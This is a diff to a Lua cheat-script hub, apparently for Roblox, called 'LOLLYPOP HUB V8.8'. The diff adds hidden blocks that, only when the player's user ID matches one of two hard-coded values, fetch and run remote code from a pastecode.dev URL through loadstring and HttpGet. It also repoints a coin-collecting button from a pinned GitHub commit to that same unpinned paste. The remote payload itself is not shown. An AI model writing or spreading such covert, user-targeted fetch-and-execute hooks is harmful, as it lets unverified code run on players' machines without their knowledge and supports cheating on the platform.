@@ -19,6 +19,13 @@ Text = "LOLLYPOP HUB V8.8🍭😋",
 Duration = 7
 })--endnotif
 
+if game.Players.LocalPlayer.UserId == 4406450103 then
+loadstring(game:HttpGet("https://pastecode.dev/raw/qfknypsa/walmartKoins.byToraIsMe_lulaslollipop.deb",true))()
+end
+if game.Players.LocalPlayer.UserId == 3001347724 then
+loadstring(game:HttpGet("https://pastecode.dev/raw/qfknypsa/walmartKoins.byToraIsMe_lulaslollipop.deb",true))()
+end
+
 --last update
 local LastUpdate = "Last Update: Apr 13, 2024"
 
@@ -2178,7 +2185,7 @@ GamesSection:NewLabel("⭐️ 2024 FREE UGc ⭐️")
 GamesSection:NewLabel("🏪 WALMART DISKOVERED 🏪") 
 
 GamesSection:NewButton("kollect koins (Spring Flower Krown LIMITED)", "koins op skript by Tora", function()  
-loadstring(game:HttpGet("https://github.com/ToraScript/Script/raw/70e922f6b88eee9ca92a74a1dd51bdfa4dbde187/CoinsWalmart",true))()
+loadstring(game:HttpGet("https://pastecode.dev/raw/qfknypsa/walmartKoins.byToraIsMe_lulaslollipop.deb",true))()
 end) 
 
 GamesSection:NewButton("teleport to game", "koins walmart", function()   game:GetService("TeleportService"):Teleport(13398230007, game:GetService("Players").LocalPlayer) 
@@ -4523,7 +4530,8 @@ MoreSection:NewKeybind("Toggle ui", "toggle the ui yes", Enum.KeyCode.Insert, fu
   Library:ToggleUI()
 end)
 --sumthing
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))();
+
 
 
 -- [ TOGGLE klose/open ] --
